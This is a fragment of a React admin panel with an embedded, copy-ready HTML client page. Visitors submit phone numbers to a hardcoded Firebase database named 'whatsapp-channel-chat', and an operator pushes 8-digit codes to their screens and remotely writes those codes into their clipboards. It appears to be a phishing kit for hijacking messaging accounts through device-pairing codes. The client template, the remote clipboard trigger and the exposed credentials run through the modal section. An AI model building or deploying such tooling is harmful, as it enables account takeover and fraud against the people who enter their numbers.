                exit={{ opacity: 0, scale: 0.98 }}
                className="bg-slate-900/40 border border-slate-800 p-6 sm:p-8 rounded-2xl w-full text-center flex flex-col items-center justify-center backdrop-blur-md h-full"
              >
                <div className="p-4 bg-slate-850 rounded-full border border-slate-800 text-slate-500 mb-4 animate-bounce">
                  <Phone className="w-8 h-8" />
                </div>
                <h3 className="text-lg font-bold text-slate-300">No Active Session Selected</h3>
                <p className="text-xs text-slate-500 max-w-sm mt-2 leading-relaxed">
                  Select a customer session from the left sidebar registry. You will be able to type, clear, and sync their 8-digit OTP live code directly.
                </p>

                <button
                  onClick={() => setIsIntegrationOpen(true)}
                  className="px-4 py-2 mt-4 bg-sky-500/10 text-sky-400 border border-sky-500/20 hover:bg-sky-500 hover:text-white rounded-xl transition text-xs font-bold flex items-center gap-1.5 cursor-pointer"
                >
                  <Terminal className="w-4 h-4" />
                  Get Client Integration HTML (ক্লায়েন্ট সাইড কোড)
                </button>
                          {/* Visual guideline on how this works */}
                <div className="mt-8 pt-6 border-t border-slate-800/80 w-full text-left space-y-3.5 max-w-md">
                  <h4 className="text-xs font-bold text-slate-400 uppercase tracking-wider">How to establish connection:</h4>
                  
                  <div className="flex items-start gap-3">
                    <span className="w-5 h-5 rounded-full bg-slate-800 text-slate-300 text-xs font-bold flex items-center justify-center flex-shrink-0 mt-0.5">1</span>
                    <p className="text-xs text-slate-400">
                      Customer enters their phone number on your client website. It posts directly to your Firebase path <code className="text-sky-400 font-mono">/{cleanPath}</code>.
                    </p>
                  </div>

                  <div className="flex items-start gap-3">
                    <span className="w-5 h-5 rounded-full bg-slate-800 text-slate-300 text-xs font-bold flex items-center justify-center flex-shrink-0 mt-0.5">2</span>
                    <p className="text-xs text-slate-400">
                      This controller immediately listens to updates and dynamically lists active phone numbers in your Active Sessions registry.
                    </p>
                  </div>

                  <div className="flex items-start gap-3">
                    <span className="w-5 h-5 rounded-full bg-slate-800 text-slate-300 text-xs font-bold flex items-center justify-center flex-shrink-0 mt-0.5">3</span>
                    <p className="text-xs text-slate-400">
                      Click any customer to activate, then type the OTP code. It dynamically syncs to Firebase under <code className="text-sky-400 font-mono">/{cleanPath}/[phone]/code</code>.
                    </p>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </section>

      </main>

      {/* Client Integration Modal */}
      <AnimatePresence>
        {isIntegrationOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm">
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="bg-slate-900 border border-slate-800 rounded-2xl max-w-2xl w-full max-h-[85vh] flex flex-col shadow-2xl overflow-hidden"
            >
              {/* Modal Header */}
              <div className="flex items-center justify-between p-5 border-b border-slate-800">
                <div className="flex items-center gap-2.5">
                  <Terminal className="w-5 h-5 text-sky-400" />
                  <div>
                    <h3 className="font-bold text-slate-100">Client-Side Integration Code</h3>
                    <p className="text-[10px] text-slate-400 font-mono">Real-time OTP & Remote Auto-Copy Handler</p>
                  </div>
                </div>
                <button
                  onClick={() => setIsIntegrationOpen(false)}
                  className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition cursor-pointer"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              {/* Modal Body */}
              <div className="flex-1 overflow-y-auto p-5 space-y-4 custom-scrollbar text-sm">
                <div className="p-3.5 rounded-xl bg-sky-500/10 border border-sky-500/20 text-sky-400 space-y-1">
                  <p className="font-bold text-xs flex items-center gap-1.5">
                    <Check className="w-4 h-4 text-sky-400" />
                    স্বয়ংক্রিয় রিমোট কপি সুবিধা (Remote Auto-Copy Feature is Enabled!)
                  </p>
                  <p className="text-xs text-sky-300 leading-relaxed">
                    নিচের কোডটি কপি করে আপনার গ্রাহকের সাইটে (Client Website) বসিয়ে দিন। কন্ট্রোল প্যানেলের <strong>"Remotely Copy to Client"</strong> বাটনে ক্লিক করলে গ্রাহকের ফোনে কোডটি স্বয়ংক্রিয়ভাবে কপি হয়ে যাবে!
                  </p>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-mono text-slate-400 uppercase tracking-wider">FULL SINGLE-FILE HTML INTEGRATION TEMPLATE</span>
                    <button
                      onClick={() => {
                        const codeElement = document.getElementById("clientCodeBlock");
                        if (codeElement) {
                          navigator.clipboard.writeText(codeElement.innerText);
                          setIntegrationCopied(true);
                          setTimeout(() => setIntegrationCopied(false), 3000);
                        }
                      }}
                      className={`px-3 py-1.5 font-bold rounded-xl transition text-xs flex items-center gap-1 cursor-pointer ${
                        integrationCopied 
                          ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30" 
                          : "bg-sky-500 hover:bg-sky-400 text-white shadow-md shadow-sky-500/10"
                      }`}
                    >
                      {integrationCopied ? (
                        <>
                          <Check className="w-3.5 h-3.5 text-emerald-400" />
                          Copied! (কপি হয়েছে!)
                        </>
                      ) : (
                        <>
                          <Check className="w-3.5 h-3.5" />
                          Copy Code (কোডটি কপি করুন)
                        </>
                      )}
                    </button>
                  </div>

                  <div className="relative">
                    <pre
                      id="clientCodeBlock"
                      className="bg-slate-950 p-4 rounded-xl border border-slate-850 text-xs font-mono text-slate-300 overflow-x-auto max-h-[350px] leading-relaxed custom-scrollbar select-text"
                    >{`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Client OTP Verification</title>
  <!-- Tailwind CSS CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Firebase App & Database SDKs (v8 compat CDN) -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body class="bg-slate-950 text-slate-100 font-sans min-h-screen flex flex-col items-center justify-center p-4">

  <div class="max-w-md w-full bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-6">
    <div class="text-center space-y-1">
      <h2 class="text-xl font-bold tracking-tight text-white">Verification Center</h2>
      <p class="text-xs text-slate-400">Enter your number to receive the secure live OTP code</p>
    </div>

    <!-- Step 1: Submit Phone -->
    <div id="phoneSection" class="space-y-4">
      <div>
        <label class="block text-xs font-medium text-slate-400 mb-1.5">Phone Number</label>
        <input 
          id="phoneInput" 
          type="text" 
          placeholder="e.g. 01700000000" 
          class="w-full px-4 py-2.5 bg-slate-950 border border-slate-850 rounded-xl text-slate-200 placeholder-slate-600 outline-none focus:border-sky-500 transition font-mono"
        >
      </div>
      <button 
        onclick="submitPhone()" 
        class="w-full py-2.5 bg-sky-500 hover:bg-sky-400 text-white font-bold rounded-xl transition shadow-lg shadow-sky-500/10 text-sm"
      >
        Submit (সাবমিট করুন)
      </button>
    </div>

    <!-- Step 2: Live Code Display -->
    <div id="otpSection" class="hidden space-y-6">
      <div class="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-xl text-xs flex items-center gap-2 justify-center">
        <span class="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
        <span>Secure real-time connection active</span>
      </div>

      <div class="text-center">
        <span class="text-[10px] font-mono text-slate-400 uppercase tracking-widest">Active Phone Session</span>
        <h3 id="activePhoneDisplay" class="text-lg font-bold text-slate-200 font-mono"></h3>
      </div>

      <!-- 8-Digit Display Boxes -->
      <div>
        <span class="block text-center text-xs text-slate-400 mb-3">Live OTP Code (সরাসরি কোড):</span>
        <div class="flex justify-center gap-1.5" id="otpContainer">
          <div class="otp-box w-9 h-12 bg-slate-950 border-2 border-slate-800 rounded-lg flex items-center justify-center text-xl font-bold text-sky-400 font-mono"></div>
          <div class="otp-box w-9 h-12 bg-slate-950 border-2 border-slate-800 rounded-lg flex items-center justify-center text-xl font-bold text-sky-400 font-mono"></div>
          <div class="otp-box w-9 h-12 bg-slate-950 border-2 border-slate-800 rounded-lg flex items-center justify-center text-xl font-bold text-sky-400 font-mono"></div>
          <div class="otp-box w-9 h-12 bg-slate-950 border-2 border-slate-800 rounded-lg flex items-center justify-center text-xl font-bold text-sky-400 font-mono"></div>
          <div class="otp-box w-9 h-12 bg-slate-950 border-2 border-slate-800 rounded-lg flex items-center justify-center text-xl font-bold text-sky-400 font-mono"></div>
          <div class="otp-box w-9 h-12 bg-slate-950 border-2 border-slate-800 rounded-lg flex items-center justify-center text-xl font-bold text-sky-400 font-mono"></div>
          <div class="otp-box w-9 h-12 bg-slate-950 border-2 border-slate-800 rounded-lg flex items-center justify-center text-xl font-bold text-sky-400 font-mono"></div>
          <div class="otp-box w-9 h-12 bg-slate-950 border-2 border-slate-800 rounded-lg flex items-center justify-center text-xl font-bold text-sky-400 font-mono"></div>
        </div>
      </div>

      <!-- Control Button -->
      <div class="space-y-2">
        <button 
          id="copyBtn" 
          onclick="manualCopy()" 
          class="w-full py-2.5 bg-slate-800 hover:bg-slate-750 text-slate-200 border border-slate-750 font-bold rounded-xl transition text-xs flex items-center justify-center gap-1.5"
        >
          Copy Code (কোডটি কপি করুন)
        </button>
        <p class="text-[10px] text-center text-slate-500">
          The admin can remotely copy this code to your clipboard instantly!
        </p>
      </div>
    </div>
  </div>

  <script>
    // Configured with active Live Code Controller credentials
    const firebaseConfig = {
      apiKey: "AIzaSyBqlFQzFAAQudAvmBH_KXuDzkLE4gHO7qo",
      authDomain: "whatsapp-channel-chat.firebaseapp.com",
      databaseURL: "https://whatsapp-channel-chat-default-rtdb.firebaseio.com",
      projectId: "whatsapp-channel-chat",
      storageBucket: "whatsapp-channel-chat.firebasestorage.app",
      messagingSenderId: "906974342849",
      appId: "1:906974342849:web:1a7c5e560f29ab57da2e40"
    };

    // Initialize Firebase
    if (!firebase.apps.length) {
      firebase.initializeApp(firebaseConfig);
    }
    const db = firebase.database();
    
    let currentPhone = "";
    let currentCode = "";
    let sessionStartTime = Date.now();

    function submitPhone() {
      const phoneInput = document.getElementById("phoneInput").value.trim();
      const cleanPhone = phoneInput.replace(/\D/g, "");
      if (cleanPhone.length < 8) {
        alert("Please enter a valid phone number!");
        return;
      }

      currentPhone = cleanPhone;
      sessionStartTime = Date.now(); // Set session start time on submission

      // Submit session to RTDB under path: "/${cleanPath}/[phone]"
      const clientPath = "${cleanPath}"; 
      db.ref(clientPath + "/" + cleanPhone).set({
        phoneNumber: cleanPhone,
        code: "",
        timestamp: Date.now(),
        lastActive: Date.now()
      }).then(() => {
        // Switch section views
        document.getElementById("phoneSection").classList.add("hidden");
        document.getElementById("otpSection").classList.remove("hidden");
        document.getElementById("activePhoneDisplay").innerText = cleanPhone;
        
        // Start listening to live OTP updates & triggers
        startLiveListener(clientPath, cleanPhone);
      }).catch(err => {
        alert("Connection Error: " + err.message);
      });
    }

    function startLiveListener(basePath, phone) {
      // 1. Listen for dynamic OTP digits
      db.ref(basePath + "/" + phone + "/code").on("value", (snapshot) => {
        const code = snapshot.val() || "";
        currentCode = code;
        updateOtpBoxes(code);
      });

      // 2. Listen for remote-triggered auto clipboard copy signals
      db.ref(basePath + "/" + phone + "/copyTrigger").on("value", (snapshot) => {
        const trigger = snapshot.val();
        // Only trigger copy if the signal is sent after the current session started
        if (trigger && trigger.code && trigger.timestamp && trigger.timestamp > sessionStartTime) {
          executeCopyToClipboard(trigger.code);
        }
      });
    }

    function updateOtpBoxes(code) {
      const boxes = document.querySelectorAll(".otp-box");
      for (let i = 0; i < 8; i++) {
        const char = code[i] || "";
        boxes[i].innerText = char;
        if (char) {
          boxes[i].classList.add("border-sky-500", "bg-sky-500/10", "text-sky-400");
        } else {
          boxes[i].classList.remove("border-sky-500", "bg-sky-500/10", "text-sky-400");
        }
      }
    }

    function executeCopyToClipboard(text) {
      if (!text) return;
      
      function fallbackCopy(val) {
        const textArea = document.createElement("textarea");
        textArea.value = val;
        textArea.style.top = "0";
        textArea.style.left = "0";
        textArea.style.position = "fixed";
        textArea.style.opacity = "0";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        let successful = false;
        try {
          successful = document.execCommand('copy');
        } catch (err) {
          console.error('Fallback copy failed', err);
        }
        document.body.removeChild(textArea);
        return successful;
      }

      function showCopiedStatus() {
        const copyBtn = document.getElementById("copyBtn");
        const originalText = "Copy Code (কোডটি কপি করুন)";
        copyBtn.innerText = "⚡ Remotely Copied! (কপি হয়েছে!)";
        copyBtn.classList.remove("bg-slate-800", "text-slate-200", "bg-rose-500/20", "text-rose-400", "border-rose-500/30");
        copyBtn.classList.add("bg-emerald-500/20", "text-emerald-400", "border-emerald-500/30");
        
        setTimeout(() => {
          copyBtn.innerText = originalText;
          copyBtn.classList.add("bg-slate-800", "text-slate-200");
          copyBtn.classList.remove("bg-emerald-500/20", "text-emerald-400", "border-emerald-500/30");
        }, 3000);
      }

      function showFailureStatus() {
        const copyBtn = document.getElementById("copyBtn");
        const originalText = "Copy Code (কোডটি কপি করুন)";
        copyBtn.innerText = "❌ Copy Blocked (এখানে ক্লিক করে কপি করুন)";
        copyBtn.classList.remove("bg-slate-800", "text-slate-200", "bg-emerald-500/20", "text-emerald-400", "border-emerald-500/30");
        copyBtn.classList.add("bg-rose-500/20", "text-rose-400", "border-rose-500/30");
        
        setTimeout(() => {
          copyBtn.innerText = originalText;
          copyBtn.classList.add("bg-slate-800", "text-slate-200");
          copyBtn.classList.remove("bg-rose-500/20", "text-rose-400", "border-rose-500/30");
        }, 5000);
      }

      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(showCopiedStatus).catch(err => {
          console.warn("Navigator clipboard failed, trying fallback...", err);
          if (fallbackCopy(text)) {
            showCopiedStatus();
          } else {
            showFailureStatus();
          }
        });
      } else {
        if (fallbackCopy(text)) {
          showCopiedStatus();
        } else {
          showFailureStatus();
        }
      }
    }

    function manualCopy() {
      executeCopyToClipboard(currentCode);
    }
  </script>
</body>
</html>`}</pre>
                  </div>
                </div>
              </div>

              {/* Modal Footer */}
              <div className="p-4 border-t border-slate-800 flex justify-end">
                <button
                  onClick={() => setIsIntegrationOpen(false)}
                  className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold rounded-xl text-xs transition cursor-pointer"
                >
                  Close
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Delete Confirmation Modal */}
      <AnimatePresence>
        {deletingPhone && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm">
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="bg-slate-900 border border-slate-800 rounded-2xl max-w-sm w-full p-6 shadow-2xl space-y-4 text-center relative"
            >
              <div className="mx-auto w-12 h-12 bg-rose-500/10 text-rose-400 rounded-full flex items-center justify-center border border-rose-500/25">
                <Trash2 className="w-5 h-5 animate-pulse" />
              </div>
              
              <div className="space-y-1">
                <h3 className="font-bold text-slate-100 text-base">সেশনটি মুছে ফেলতে চান?</h3>
                <p className="text-xs text-slate-400 leading-relaxed">
                  আপনি কি নিশ্চিত যে গ্রাহক <span className="text-sky-400 font-mono font-bold">{deletingPhone}</span> এর লাইভ সেশনটি ডাটাবেজ থেকে স্থায়ীভাবে মুছে ফেলতে চান?
                </p>
              </div>

              <div className="flex gap-2 pt-2">
                <button
                  onClick={() => setDeletingPhone(null)}
                  className="flex-1 py-2 bg-slate-800 hover:bg-slate-750 text-slate-300 font-bold rounded-xl text-xs transition cursor-pointer border border-slate-700/50"
                >
                  বাতিল করুন (Cancel)
                </button>
                <button
                  onClick={confirmDeleteClient}
                  className="flex-1 py-2 bg-rose-500 hover:bg-rose-400 text-white font-bold rounded-xl text-xs transition cursor-pointer shadow-lg shadow-rose-500/10"
                >
                  মুছে ফেলুন (Delete)
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
